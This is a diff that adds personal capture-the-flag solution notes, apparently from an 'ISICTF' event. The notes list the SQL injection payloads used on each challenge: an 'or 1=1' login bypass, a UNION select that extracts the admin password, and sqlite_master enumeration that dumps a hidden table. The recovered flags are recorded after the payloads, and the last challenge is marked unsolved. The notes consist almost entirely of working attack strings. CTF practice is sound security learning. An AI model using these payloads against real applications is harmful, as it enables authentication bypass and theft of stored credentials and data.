@@ -1,0 +1,23 @@
+1 - admin'" or 1=1--
+# ISICTF{my_f1r57_sql_1nj3c710n}
+===========
+2 - admin'" union select password from users where username = 'admin'--
+
+#ISICTF{7w0_f0r_7wo_un10n_b4s3d_1nj3ct10n}
+==========
+3 - 
+#gg'+union+SELECT+null,+null,+tbl_name+from+sqlite_master--
+
+table_name = pphovqxgexkavjiecxqnlqxstwuxfa
+
+#gg'+union+SELECT+null,+null,sql+from+sqlite_master+where+tbl_name='pphovqxgexkavjiecxqnlqxstwuxfa'--
+
+
+=> "CREATE TABLE pphovqxgexkavjiecxqnlqxstwuxfa(id INTEGER PRIMARY KEY, wxhmeybkhmacvqxjedfchmezynldop TEXT)"
+
+#gg'union+SELECT+null,+null,+wxhmeybkhmacvqxjedfchmezynldop+FROM+pphovqxgexkavjiecxqnlqxstwuxfa--
+
+=>"ISICTF{343_sql_1nj3ct10n_b345t}"
+============
+
+4 - didnt solve the last one :( 
